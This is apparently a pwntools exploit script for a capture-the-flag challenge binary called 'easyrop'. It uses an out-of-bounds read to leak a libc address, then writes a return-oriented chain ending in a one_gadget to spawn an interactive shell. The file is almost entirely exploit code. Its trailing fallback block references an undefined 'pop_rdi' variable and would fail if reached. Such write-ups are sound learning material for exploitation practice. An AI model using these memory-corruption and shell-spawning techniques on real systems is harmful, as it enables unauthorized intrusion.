#!/usr/bin/env python3

from pwn import *

exe = ELF("./easyrop")
libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


r = conn()
#r = remote("challs.tfcctf.com", 31709)

def read_oob(index):
    r.sendline("2")
    r.sendlineafter("Select index: ", str(index))
    r.recvuntil(" is ")
    return int(r.recvline().strip(), 16)

def write_oob(index, val):
    r.sendline("1")
    r.sendlineafter("Select index: ", str(index))
    r.sendlineafter("write: ", str(val))

def trigger():
    r.sendline("3")

def write_64(index, val):
    write_oob(index,  val & 0xffffffff)
    write_oob(index+1, (val >> 32) & 0xffffffff)

def main():
    
    leak = read_oob(130) | (read_oob(131) << 32)
    info(f"read_oob(131) << 32 :{hex(read_oob(131))},{hex(read_oob(131) << 32)}")
    info(f"leak : {hex(leak)}")
    libc.address = leak - libc.symbols['__libc_start_call_main']-122
    log.info("Libc address @ 0x%x", libc.address)
    
    pop_rdi_rbp = libc.address + 0x000000000002a745
    system = libc.sym.system
    binsh = next(libc.search(b"/bin/sh"))
    

    write_oob(128, exe.bss(0x40))
    write_64(130, libc.address + 0x00000000000f6fae)
    write_oob(134, 0x40101a)
    write_64(136, 0x0000000000401016)
    write_oob(140, 0x40101a)
    write_64(142, libc.address + 0x50a37 ) #one_gadget

    trigger()
    r.interactive()

    #write_64(134+2, libc.sym.gets)

    pause()
    write_oob(134, (pop_rdi + 1) & 0xffffffff)
    write_oob(135, (pop_rdi  >> 32) & 0xffffffff)

    write_oob(136, system & 0xffffffff)
    write_oob(137, (system >> 32) & 0xffffffff)

    trigger()
    r.interactive()


if __name__ == "__main__":
    main()
